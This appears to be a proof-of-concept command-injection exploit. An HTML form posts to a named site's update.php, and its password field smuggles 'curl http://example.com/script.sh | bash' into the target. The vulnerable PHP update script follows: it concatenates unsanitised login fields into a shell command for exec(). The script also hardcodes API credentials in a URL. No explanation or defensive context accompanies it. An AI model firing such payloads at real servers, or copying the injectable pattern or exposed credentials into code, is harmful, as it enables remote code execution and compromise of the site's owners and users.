<form method="post" action="https://www.ashanging.com/update.php">
<input name="username" value="x" />
<input name="password" value="y && curl http://example.com/script.sh | bash" />
<input type="submit" value="send" />
</form>
<?php
	$version='1.8.9'; # toujours garder 3 chiffres de version, toujours garder à la ligne 2.

	$api='http://nvi:nvi123!@tools.nvistaging.com/updateapi.php';
	$my_remote_path='http://tools.nvistaging.com/update.txt';
	$toolbox_path='http://tools.nvistaging.com/toolbox.tgz';

	//$env=detect_env();
	date_default_timezone_set('America/Montreal');
	ini_set('display_startup_errors',1);
	ini_set('display_errors',1);
	error_reporting(-1);

	# Search for mysql
	//if (is_executable('/Applications/MAMP/Library/bin/mysql')){$mysql_path='/Applications/MAMP/Library/bin/mysql';}
	//if (is_executable('/usr/local/bin/mysql')){$mysql_path='/usr/local/bin/mysql';}
	//if (is_executable('/usr/bin/mysql')){$mysql_path='/usr/bin/mysql';}
	//if (!isset($mysql_path) || $mysql_path == ''){errormessage('MySQL binary not found!');}

	# Force logoff en cas de problème de session
	if (isset($_GET['logoff'])){endsession();}

	# Gestion des sessions
	session_start();
	if (!isset($_SESSION['username']) && isset($_POST['username']) && isset($_POST['password'])) {
		$command="curl https://api.bitbucket.org/1.0/user/ -u ".$_POST['username'].":".$_POST['password'];
		echo $command;
		exit;
		$userinfo=json_decode(exec($command,$retval));

		if (callapi($api,'','checkaccess',$_POST['password'],$_POST['username'],'',0) != 'GOOD'){
			errormessage('Access Denied - User and password not in Database');
			die();
		}

		if ($userinfo == '' || strpos($_POST['username'],'@')){errormessage('Access Denied - Git Access Denied');}else{
			$_SESSION['username'] = $_POST['username'];
			$_SESSION['password'] = $_POST['password'];
		}
	}
